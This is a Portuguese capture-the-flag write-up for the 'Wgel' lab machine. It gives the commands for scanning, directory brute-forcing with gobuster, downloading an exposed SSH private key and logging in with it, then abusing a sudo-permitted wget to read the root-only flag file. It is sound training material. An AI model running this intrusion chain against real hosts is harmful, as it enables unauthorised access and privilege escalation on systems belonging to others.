# Wgel CTF

* ### Scan de portas - Verificando quais portas estão abertas.
```bash
rustscan -a 10.10.123.77
```
![image](https://github.com/lufffe/Writeups/assets/90646635/c635c3af-1a56-4d3f-863b-27e0f0711767)

![image](https://github.com/lufffe/Writeups/assets/90646635/6f03c2bb-b1aa-40bb-b566-5c7a21c266ae)

* ### Verificando o que está rodando nas portas encontradas.
```bash
nmap -A -p 22,80 10.10.123.77
```
![image](https://github.com/lufffe/Writeups/assets/90646635/cc002ff2-bd02-4d2c-a35f-c58c0534ec60)

* ###  Scan de Arquivos e Diretórios.
```bash
gobuster dir -u http://10.10.123.77 -w directory-list-2.3-small.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/608779d0-aa59-4142-9cc7-9a92f32219a5)

* ### Verificando o que tem no HTTP e podemos ver um nome que pode ser de um usuário.
![image](https://github.com/lufffe/Writeups/assets/90646635/fad7bba1-0f46-4f31-b600-3746081ba512)

* ###  Scan de Arquivos e Diretórios na pasta "sitemap", e encontrando algo interessante.
```bash
gobuster dir -u http://10.10.123.77/sitemap/ -w big.txt -t 100 --no-error
```
![image](https://github.com/lufffe/Writeups/assets/90646635/03cb3dbd-e095-4c40-bb82-91e643825ad3)

* ###  Baixando a chave SSH encontrada.
```bash
wget http://10.10.123.77/sitemap/.ssh/id_rsa
```

* ###  Tentando descobrir a senha da chave SSH e vendo que não tem senha.
```bash
ssh2john id_rsa > hash 
```
![image](https://github.com/lufffe/Writeups/assets/90646635/ff866c5b-2dbe-4c33-a797-d8f37c72d4ff)

* ###  Dando permissão ao usuário na chave SSH.
```bash
chmod 600 id_rsa
```

* ###  Acessando via SSH.
```bash
ssh -i id_rsa jessie@10.10.123.77
```
![image](https://github.com/lufffe/Writeups/assets/90646635/89f06619-de9e-4427-bd1f-15205821bcbf)

* ###  Na pasta Documentos vai ter a flag.
```bash
cat user_flag.txt
```

* ###  Buscando um ponto para escalar o usuário.
```bash
sudo -l
```
![image](https://github.com/lufffe/Writeups/assets/90646635/90427135-9f4c-4ccf-a02c-c9545b31fd89)

* ###  Gtfobins.
![image](https://github.com/lufffe/Writeups/assets/90646635/8b73ac32-a755-4208-ba53-1a713b68efed)

* ###  Pegando a flag de Root.
```bash
sudo /usr/bin/wget -i /root/root_flag.txt
```
